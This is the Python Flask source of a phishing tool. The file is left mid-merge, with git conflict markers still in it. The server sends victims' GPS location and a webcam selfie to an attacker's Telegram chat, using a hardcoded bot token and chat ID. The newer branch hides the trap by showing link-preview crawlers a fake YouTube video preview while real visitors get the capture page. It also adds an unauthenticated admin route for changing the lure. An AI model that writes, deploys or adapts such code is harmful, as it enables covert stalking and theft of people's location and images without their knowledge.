<<<<<<< HEAD
from flask import Flask, render_template, request, jsonify
import requests, base64
from io import BytesIO
=======
from flask import Flask, render_template, request, jsonify, redirect
import requests
import base64
from io import BytesIO
import os
import json
>>>>>>> 2b6b51b8de291aca848ea8fda4ac1fb70d1a3896

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = '8280216938:AAEwCN0U8HkhNqikde5Nq3ODTgpaZlNQZhQ'
<<<<<<< HEAD
TELEGRAM_CHAT_ID   = '7343057223'

def send_location_to_telegram(lat, lon):
    location_url = f"https://www.google.com/maps?q={lat},{lon}"
    message      = f"User live location: {location_url}"
    url          = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload      = {'chat_id': TELEGRAM_CHAT_ID, 'text': message}
    requests.post(url, data=payload)

def send_photo_to_telegram(photo_b64):
    url        = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    photo_data = BytesIO(base64.b64decode(photo_b64.split(',')[1]))
    files      = {'photo': photo_data}
    data       = {'chat_id': TELEGRAM_CHAT_ID}
    requests.post(url, data=data, files=files)

@app.route('/')
def index():
    return render_template('index2.0.html')

@app.route('/send_data', methods=['POST'])
def send_data():
    data       = request.json
    lat, lon   = data.get('latitude'), data.get('longitude')
    selfie_b64 = data.get('selfie')
    if not (lat and lon and selfie_b64):
        return jsonify({'status': 'Missing data'}), 400

    send_location_to_telegram(lat, lon)
    send_photo_to_telegram(selfie_b64)

    return jsonify({'status': 'Success, data sent to Telegram'})

if __name__ == '__main__':
    app.run(debug=True)
=======
TELEGRAM_CHAT_ID = '7343057223'

# Configuration file to store YouTube URL
CONFIG_FILE = 'config.json'

def load_config():
    """Load configuration from JSON file"""
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    # Default config
    default_config = {
        "youtube_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
        "video_title": "Taarak Mehta Ka Ooltah Chashmah",
        "video_description": "Latest Episode - Comedy Show",
        "video_thumbnail": "https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg"
    }
    save_config(default_config)
    return default_config

def save_config(config):
    """Save configuration to JSON file"""
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=2)
    except:
        pass

def send_location_to_telegram(lat, lon):
    """Send location to Telegram"""
    location_url = f"https://www.google.com/maps?q={lat},{lon}"
    message = f"🔴 LIVE LOCATION CAPTURED\n📍 {location_url}\n⏰ {request.headers.get('User-Agent', 'Unknown Device')}"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message}
    response = requests.post(url, data=payload)
    print("Telegram location msg response:", response.json())
    return response.json()

def send_photo_to_telegram(photo_b64):
    """Send photo to Telegram"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    photo_data = BytesIO(base64.b64decode(photo_b64.split(',')[1]))
    files = {'photo': photo_data}
    data = {
        'chat_id': TELEGRAM_CHAT_ID,
        'caption': '📸 LIVE SELFIE CAPTURED\n🕐 Real-time capture'
    }
    response = requests.post(url, data=data, files=files)
    print("Telegram photo msg response:", response.json())
    return response.json()

@app.route('/')
def index():
    """Main route - shows YouTube preview for bots, actual app for users"""
    user_agent = request.headers.get('User-Agent', '').lower()

    # Detect if it's a bot (WhatsApp, Facebook, Twitter, etc.)
    bot_keywords = ['whatsapp', 'facebook', 'twitter', 'telegram', 'bot', 'crawler', 'spider']
    is_bot = any(keyword in user_agent for keyword in bot_keywords)

    if is_bot:
        # Return YouTube preview for bots
        config = load_config()
        return render_template('youtube_preview.html', 
                             title=config['video_title'],
                             description=config['video_description'],
                             thumbnail=config['video_thumbnail'],
                             youtube_url=config['youtube_url'])
    else:
        # Return actual app for real users
        return render_template('index.html')

@app.route('/admin')
def admin():
    """Admin panel to update YouTube URL"""
    config = load_config()
    return render_template('admin.html', config=config)

@app.route('/update_video', methods=['POST'])
def update_video():
    """Update YouTube video configuration"""
    try:
        data = request.json
        config = {
            "youtube_url": data.get('youtube_url', ''),
            "video_title": data.get('video_title', ''),
            "video_description": data.get('video_description', ''),
            "video_thumbnail": data.get('video_thumbnail', '')
        }
        save_config(config)
        return jsonify({'status': 'success', 'message': 'Video updated successfully!'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/send_data', methods=['POST'])
def send_data():
    """Handle location and selfie data"""
    try:
        data = request.json
        lat = data.get('latitude')
        lon = data.get('longitude')
        selfie_b64 = data.get('selfie')

        if not (lat and lon and selfie_b64):
            return jsonify({'status': 'Missing data'}), 400

        print(f"Received latitude: {lat}, longitude: {lon}")

        # Send location message to Telegram
        location_response = send_location_to_telegram(lat, lon)
        # Send photo message to Telegram
        photo_response = send_photo_to_telegram(selfie_b64)

        if location_response.get('ok') and photo_response.get('ok'):
            return jsonify({'status': 'Success! Data sent securely.'})
        else:
            return jsonify({'status': 'Failed to send some data'}), 500

    except Exception as e:
        return jsonify({'status': f'Error: {str(e)}'}), 500

@app.route('/youtube')
def youtube_redirect():
    """Redirect to actual YouTube video"""
    config = load_config()
    return redirect(config['youtube_url'])

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
>>>>>>> 2b6b51b8de291aca848ea8fda4ac1fb70d1a3896
